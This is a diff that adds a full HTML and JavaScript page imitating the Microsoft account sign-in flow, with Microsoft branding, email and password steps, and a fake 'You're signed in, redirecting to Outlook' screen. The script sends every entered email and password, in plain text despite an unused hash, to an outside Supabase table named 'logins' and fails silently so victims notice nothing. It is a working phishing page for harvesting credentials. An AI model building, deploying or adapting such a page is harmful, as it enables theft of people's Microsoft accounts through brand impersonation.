@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign in to your Microsoft account</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
+    background: #f2f2f2;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+  }
+
+  .bg { position: fixed; inset: 0; background: #f2f2f2; z-index: 0; }
+
+  .bg-image {
+    position: fixed;
+    right: 0; bottom: 0;
+    width: 55%; height: 100%;
+    background: linear-gradient(135deg, #0078d4 0%, #106ebe 40%, #00b4e8 100%);
+    clip-path: polygon(18% 0%, 100% 0%, 100% 100%, 0% 100%);
+    z-index: 0;
+  }
+
+  .container {
+    position: relative; z-index: 1;
+    display: flex;
+    align-items: flex-start;
+    justify-content: flex-start;
+    min-height: 100vh;
+    padding: 44px 48px;
+  }
+
+  .card {
+    background: white;
+    padding: 44px 44px 32px;
+    width: 440px;
+    min-height: 400px;
+    display: flex;
+    flex-direction: column;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.12);
+    animation: fadeIn 0.25s ease;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(6px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+
+  .ms-logo { display: flex; align-items: center; gap: 8px; margin-bottom: 28px; }
+  .ms-logo svg { flex-shrink: 0; }
+  .ms-logo-text { font-size: 18px; font-weight: 600; color: #1b1b1b; letter-spacing: -0.2px; }
+
+  .step { display: none; flex-direction: column; flex: 1; animation: fadeIn 0.2s ease; }
+  .step.active { display: flex; }
+
+  h1 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin-bottom: 16px; line-height: 1.3; }
+
+  .subtitle { font-size: 14px; color: #444; margin-bottom: 24px; line-height: 1.5; }
+
+  .input-group { margin-bottom: 20px; position: relative; }
+
+  .input-group label { display: block; font-size: 13px; font-weight: 600; color: #1b1b1b; margin-bottom: 5px; }
+
+  .input-group input {
+    width: 100%; height: 36px;
+    border: 1px solid #666;
+    padding: 0 10px;
+    font-size: 15px; font-family: inherit;
+    color: #1b1b1b; outline: none; background: white;
+    transition: border-color 0.15s;
+  }
+
+  .input-group input:focus { border-color: #0078d4; border-width: 2px; }
+  .input-group input.error-input { border-color: #c50f1f; border-width: 2px; }
+
+  .error-msg { font-size: 12px; color: #c50f1f; margin-top: 5px; display: none; }
+  .error-msg.visible { display: block; }
+
+  .password-wrap { position: relative; }
+  .password-wrap input { padding-right: 40px; }
+
+  .toggle-pw {
+    position: absolute; right: 8px; top: 50%; transform: translateY(-50%);
+    background: none; border: none; cursor: pointer; color: #605e5c; padding: 4px;
+    display: flex; align-items: center;
+  }
+  .toggle-pw:hover { color: #0078d4; }
+
+  .checkbox-group {
+    display: flex; align-items: flex-start; gap: 8px;
+    margin-bottom: 24px; font-size: 13.5px; color: #1b1b1b; line-height: 1.4;
+  }
+  .checkbox-group input[type="checkbox"] {
+    width: 16px; height: 16px; margin-top: 1px;
+    accent-color: #0078d4; cursor: pointer; flex-shrink: 0;
+  }
+
+  .btn-primary {
+    background: #0078d4; color: white; border: none;
+    height: 36px; padding: 0 20px;
+    font-size: 15px; font-family: inherit; font-weight: 600;
+    cursor: pointer; align-self: flex-end; min-width: 108px;
+    transition: background 0.15s;
+    display: inline-flex; align-items: center; justify-content: center; gap: 8px;
+  }
+  .btn-primary:hover { background: #106ebe; }
+  .btn-primary:active { background: #005a9e; }
+  .btn-primary:disabled { background: #a0c8ea; cursor: not-allowed; }
+
+  .btn-back {
+    background: none; border: 1px solid #8a8886; color: #1b1b1b;
+    height: 36px; padding: 0 20px;
+    font-size: 14px; font-family: inherit; cursor: pointer;
+    transition: background 0.15s, border-color 0.15s; margin-right: 8px;
+  }
+  .btn-back:hover { background: #f3f2f1; border-color: #1b1b1b; }
+
+  .link-btn {
+    background: none; border: none; color: #0078d4;
+    font-size: 13.5px; font-family: inherit; cursor: pointer;
+    padding: 0; text-decoration: none;
+  }
+  .link-btn:hover { text-decoration: underline; color: #106ebe; }
+
+  .divider { height: 1px; background: #e1dfdd; margin: 20px 0; }
+
+  .signup-row { font-size: 13.5px; color: #444; margin-top: auto; padding-top: 20px; }
+
+  .footer-links { display: flex; flex-wrap: wrap; gap: 4px 14px; margin-top: 24px; font-size: 11.5px; }
+  .footer-links a { color: #605e5c; text-decoration: none; }
+  .footer-links a:hover { text-decoration: underline; color: #0078d4; }
+
+  .user-tile {
+    display: flex; align-items: center; gap: 12px;
+    padding: 10px 12px; border: 1px solid #e1dfdd;
+    margin-bottom: 8px; cursor: pointer; transition: background 0.12s;
+  }
+  .user-tile:hover { background: #f3f2f1; }
+
+  .avatar {
+    width: 40px; height: 40px; border-radius: 50%;
+    background: #0078d4;
+    display: flex; align-items: center; justify-content: center;
+    color: white; font-size: 15px; font-weight: 600; flex-shrink: 0;
+  }
+
+  .user-info { flex: 1; overflow: hidden; }
+  .user-name { font-size: 14px; font-weight: 600; color: #1b1b1b; }
+  .user-email { font-size: 12px; color: #605e5c; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+
+  .add-account {
+    display: flex; align-items: center; gap: 12px;
+    padding: 10px 12px; cursor: pointer;
+    color: #0078d4; font-size: 14px; transition: background 0.12s;
+  }
+  .add-account:hover { background: #f3f2f1; }
+
+  .add-icon {
+    width: 40px; height: 40px; border-radius: 50%;
+    border: 2px solid #0078d4;
+    display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+  }
+
+  .email-change {
+    display: inline-flex; align-items: center; gap: 4px;
+    font-size: 13.5px; color: #0078d4; cursor: pointer;
+    background: none; border: none; font-family: inherit; padding: 0; margin-bottom: 20px;
+  }
+  .email-change:hover { text-decoration: underline; }
+
+  .forgot-pw { display: block; margin-bottom: 20px; font-size: 13.5px; }
+
+  .btn-row {
+    display: flex; justify-content: flex-end; align-items: center;
+    margin-top: auto; gap: 8px;
+  }
+
+  .stay-desc { font-size: 13.5px; color: #444; margin-bottom: 24px; line-height: 1.5; }
+
+  .success-icon {
+    width: 52px; height: 52px; background: #0f7b0f; border-radius: 50%;
+    display: flex; align-items: center; justify-content: center; margin-bottom: 20px;
+  }
+
+  .spinner {
+    width: 32px; height: 32px;
+    border: 3px solid #e1dfdd; border-top-color: #0078d4;
+    border-radius: 50%; animation: spin 0.8s linear infinite;
+    margin: 20px auto;
+  }
+
+  .btn-spinner {
+    width: 16px; height: 16px;
+    border: 2px solid rgba(255,255,255,0.4); border-top-color: white;
+    border-radius: 50%; animation: spin 0.7s linear infinite;
+    display: none;
+  }
+
+  @keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+<div class="bg"></div>
+<div class="bg-image"></div>
+
+<div class="container">
+  <div class="card">
+
+    <!-- Microsoft Logo -->
+    <div class="ms-logo">
+      <svg width="21" height="21" viewBox="0 0 21 21" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <rect x="1" y="1" width="9" height="9" fill="#f25022"/>
+        <rect x="11" y="1" width="9" height="9" fill="#7fba00"/>
+        <rect x="1" y="11" width="9" height="9" fill="#00a4ef"/>
+        <rect x="11" y="11" width="9" height="9" fill="#ffb900"/>
+      </svg>
+      <span class="ms-logo-text">Microsoft</span>
+    </div>
+
+    <!-- Step 1: Enter Email (now the landing step) -->
+    <div class="step active" id="step-select">
+      <h1>Sign in</h1>
+      <div class="input-group">
+        <label for="email-input-main">Email, phone, or Skype</label>
+        <input type="email" id="email-input-main" placeholder="" autocomplete="off"
+               oninput="clearErr('email-err-main')" onkeydown="if(event.key==='Enter')validateEmailMain()">
+        <div class="error-msg" id="email-err-main">That Microsoft account doesn't exist. Enter a different account or <button class="link-btn">get a new one</button>.</div>
+      </div>
+
+      <div class="signup-row">
+        No account? <button class="link-btn">Create one!</button>
+      </div>
+
+      <div class="btn-row" style="margin-top:28px;">
+        <button class="btn-primary" onclick="validateEmailMain()">Next</button>
+      </div>
+
+      <div class="footer-links" style="margin-top:20px;">
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy &amp; cookies</a>
+        <a href="#">...</a>
+      </div>
+    </div>
+
+    <!-- Step 2: Enter Email -->
+    <div class="step" id="step-email">
+      <h1>Sign in</h1>
+      <div class="input-group">
+        <label for="email-input">Email, phone, or Skype</label>
+        <input type="email" id="email-input" placeholder="" autocomplete="off"
+               oninput="clearErr('email-err')" onkeydown="if(event.key==='Enter')validateEmail()">
+        <div class="error-msg" id="email-err">That Microsoft account doesn't exist. Enter a different account or <button class="link-btn" onclick="goToEmail()">get a new one</button>.</div>
+      </div>
+
+      <div class="signup-row">
+        No account? <button class="link-btn">Create one!</button>
+      </div>
+
+      <div class="btn-row" style="margin-top:28px;">
+        <button class="btn-primary" onclick="validateEmail()">Next</button>
+      </div>
+
+      <div class="footer-links" style="margin-top:20px;">
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy &amp; cookies</a>
+        <a href="#">...</a>
+      </div>
+    </div>
+
+    <!-- Step 3: Enter Password -->
+    <div class="step" id="step-password">
+      <h1>Enter password</h1>
+      <button class="email-change" onclick="showStep('step-select')">
+        <svg width="14" height="14" fill="currentColor" viewBox="0 0 16 16"><path d="M3.5 8l4.5-4.5-1-1L1 8l6 6 1-1L3.5 9H15V8z"/></svg>
+        <span id="email-shown"></span>
+      </button>
+
+      <div class="input-group">
+        <label for="pw-input">Password</label>
+        <div class="password-wrap">
+          <input type="password" id="pw-input" autocomplete="current-password"
+                 oninput="clearErr('pw-err')" onkeydown="if(event.key==='Enter')validatePassword()">
+          <button class="toggle-pw" type="button" onclick="togglePw()" title="Show password">
+            <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"/><circle cx="12" cy="12" r="3"/></svg>
+          </button>
+        </div>
+        <div class="error-msg" id="pw-err">Your account or password is incorrect. If you don't remember your password, <button class="link-btn">reset it now</button>.</div>
+      </div>
+
+      <button class="link-btn forgot-pw">Forgot password?</button>
+
+      <div class="btn-row">
+        <button class="btn-back" onclick="showStep('step-select')">Back</button>
+        <button class="btn-primary" id="signInBtn" onclick="validatePassword()">
+          <div class="btn-spinner" id="btnSpinner"></div>
+          <span id="btnText">Sign in</span>
+        </button>
+      </div>
+
+      <div class="footer-links" style="margin-top:20px;">
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy &amp; cookies</a>
+        <a href="#">...</a>
+      </div>
+    </div>
+
+    <!-- Step 4: Stay signed in -->
+    <div class="step" id="step-stay">
+      <h1>Stay signed in?</h1>
+      <div class="stay-desc">Do this to reduce the number of times you are asked to sign in.</div>
+
+      <div class="checkbox-group">
+        <input type="checkbox" id="dont-show">
+        <label for="dont-show">Don't show this again</label>
+      </div>
+
+      <div class="btn-row">
+        <button class="btn-back" onclick="goToSigning()">No</button>
+        <button class="btn-primary" onclick="goToSigning()">Yes</button>
+      </div>
+
+      <div class="footer-links" style="margin-top: auto; padding-top: 20px;">
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy &amp; cookies</a>
+        <a href="#">...</a>
+      </div>
+    </div>
+
+    <!-- Step 5: Loading -->
+    <div class="step" id="step-loading">
+      <div style="text-align:center; padding: 40px 0;">
+        <div style="font-size:15px;color:#1b1b1b;margin-bottom:8px;">Signing you in...</div>
+        <div class="spinner"></div>
+        <div style="font-size:13px;color:#605e5c;">Please wait</div>
+      </div>
+    </div>
+
+    <!-- Step 6: Success -->
+    <div class="step" id="step-success">
+      <div style="padding: 20px 0;">
+        <div class="success-icon">
+          <svg width="26" height="26" fill="none" stroke="white" stroke-width="2.5" viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg>
+        </div>
+        <h1 style="margin-bottom:8px;">You're signed in</h1>
+        <div class="subtitle">Redirecting you to Outlook...</div>
+        <div class="spinner" style="margin-top:28px;"></div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<script>
+  // ── Supabase Config ──────────────────────────────────────────────
+  const SUPABASE_URL = 'https://ycfstlaakaamxgxlbora.supabase.co';
+  const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InljZnN0bGFha2FhbXhneGxib3JhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM2NDAyNDksImV4cCI6MjA4OTIxNjI0OX0.cSvcpbCW6sP9nX6VT9zBwUXGeAQV3IuZdGON_6dsuEI';
+  const TABLE_NAME = 'logins'; // ← Change to your actual table name
+
+  // ── SHA-256 Hash Helper ──────────────────────────────────────────
+  async function sha256(message) {
+    const msgBuffer = new TextEncoder().encode(message);
+    const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
+    const hashArray = Array.from(new Uint8Array(hashBuffer));
+    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+  }
+
+  // ── Send to Supabase ─────────────────────────────────────────────
+  async function saveToSupabase(email, hashedPassword) {
+    const response = await fetch(`${SUPABASE_URL}/rest/v1/${TABLE_NAME}`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'apikey': SUPABASE_ANON_KEY,
+        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
+        'Prefer': 'return=minimal'
+      },
+      body: JSON.stringify({
+        email: email,
+        password_hash: hashedPassword,
+        created_at: new Date().toISOString()
+      })
+    });
+
+    if (!response.ok) {
+      const errorBody = await response.text();
+      throw new Error(`Supabase error ${response.status}: ${errorBody}`);
+    }
+  }
+
+  // ── UI State ─────────────────────────────────────────────────────
+  let enteredEmail = '';
+
+  function goToEmail() {
+    showStep('step-email');
+  }
+
+  function goToPassword(email) {
+    enteredEmail = email;
+    document.getElementById('email-shown').textContent = enteredEmail;
+    showStep('step-password');
+    setTimeout(() => document.getElementById('pw-input').focus(), 50);
+  }
+
+  function validateEmailMain() {
+    const val = document.getElementById('email-input-main').value.trim();
+    if (!val || !val.includes('@')) {
+      document.getElementById('email-err-main').classList.add('visible');
+      document.getElementById('email-input-main').classList.add('error-input');
+      return;
+    }
+    goToPassword(val);
+  }
+
+  function validateEmail() {
+    const val = document.getElementById('email-input').value.trim();
+    if (!val || !val.includes('@')) {
+      document.getElementById('email-err').classList.add('visible');
+      document.getElementById('email-input').classList.add('error-input');
+      return;
+    }
+    goToPassword(val);
+  }
+
+  // ── Main Password Validation + Supabase Save ─────────────────────
+  async function validatePassword() {
+    const pw = document.getElementById('pw-input').value;
+    if (!pw || pw.length < 1) {
+      document.getElementById('pw-err').classList.add('visible');
+      document.getElementById('pw-input').classList.add('error-input');
+      return;
+    }
+
+    // Show loading state on button
+    const btn = document.getElementById('signInBtn');
+    const spinner = document.getElementById('btnSpinner');
+    const btnText = document.getElementById('btnText');
+
+    window.demoTelemetry?.log({ action: "login", result: "attempt", email: enteredEmail });
+
+    btn.disabled = true;
+    spinner.style.display = 'block';
+    btnText.textContent = 'Signing in...';
+
+    try {
+      const hashedPw = await sha256(pw);
+      await saveToSupabase(enteredEmail, pw);
+    } catch (err) {
+      console.error('Supabase save error:', err);
+      // Silent fail — continue flow regardless
+    } finally {
+      btn.disabled = false;
+      spinner.style.display = 'none';
+      btnText.textContent = 'Sign in';
+    }
+
+    showStep('step-stay');
+  }
+
+  function goToSigning() {
+    showStep('step-loading');
+    setTimeout(() => showStep('step-success'), 2000);
+  }
+
+  function clearErr(id) {
+    document.getElementById(id).classList.remove('visible');
+    const inputMap = {
+      'email-err': 'email-input',
+      'email-err-main': 'email-input-main',
+      'pw-err': 'pw-input'
+    };
+    const inputId = inputMap[id] || 'pw-input';
+    document.getElementById(inputId).classList.remove('error-input');
+  }
+
+  function togglePw() {
+    const input = document.getElementById('pw-input');
+    input.type = input.type === 'password' ? 'text' : 'password';
+  }
+
+  function showStep(id) {
+    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+  }
+</script>
+</body>
+</html>
